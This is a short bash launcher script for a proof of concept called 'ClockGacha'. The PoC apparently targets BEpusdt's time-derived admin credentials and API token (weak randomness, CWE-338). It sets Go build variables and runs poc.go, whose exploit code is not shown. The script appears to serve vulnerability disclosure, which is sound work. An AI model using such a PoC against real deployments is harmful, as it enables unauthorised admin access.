#!/usr/bin/env bash
# ClockGacha PoC — BEpusdt time-derived admin credentials / API token (CWE-338)
set -euo pipefail
cd "$(dirname "$0")"

export GOTOOLCHAIN=local
export GOFLAGS=-mod=mod
export CGO_ENABLED=0

# Build a standalone binary (no module deps needed; reimplements two 1-line hashes)
go run poc.go
